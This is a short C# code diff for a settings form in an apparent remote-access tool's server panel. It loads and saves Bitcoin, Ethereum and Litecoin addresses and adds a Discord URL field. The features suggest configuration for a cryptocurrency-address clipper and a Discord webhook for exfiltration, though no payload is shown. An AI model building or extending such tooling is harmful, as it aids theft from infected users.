@@ -38,10 +38,12 @@ namespace Server.Forms
                 catch { }
             }
             
-            txtBTC.Text = Properties.Settings.Default.BtcAddr;
-            txtETH.Text = Properties.Settings.Default.EthAddr;
-            txtLTC.Text = Properties.Settings.Default.LtcAddr;
+            if (!string.IsNullOrEmpty(Properties.Settings.Default.BtcAddr)) txtBTC.Text = Properties.Settings.Default.BtcAddr;
+            if (!string.IsNullOrEmpty(Properties.Settings.Default.EthAddr)) txtETH.Text = Properties.Settings.Default.EthAddr;
+            if (!string.IsNullOrEmpty(Properties.Settings.Default.LtcAddr)) txtLTC.Text = Properties.Settings.Default.LtcAddr;
+            if (!string.IsNullOrEmpty(Properties.Settings.Default.DiscordUrl)) textBoxDisrordURL.Text = Properties.Settings.Default.DiscordUrl;
 
+            //textBoxDisrordURL
             this.Text = $"{Settings.Version} | Welcome {Environment.UserName}";
 
             if (!File.Exists(Settings.CertificatePath))
@@ -72,6 +74,7 @@ namespace Server.Forms
                 Properties.Settings.Default.BtcAddr = txtBTC.Text;
                 Properties.Settings.Default.EthAddr = txtETH.Text;
                 Properties.Settings.Default.LtcAddr = txtLTC.Text;
+                Properties.Settings.Default.DiscordUrl = textBoxDisrordURL.Text;
 
                 Properties.Settings.Default.Save();
                 isOK = true;
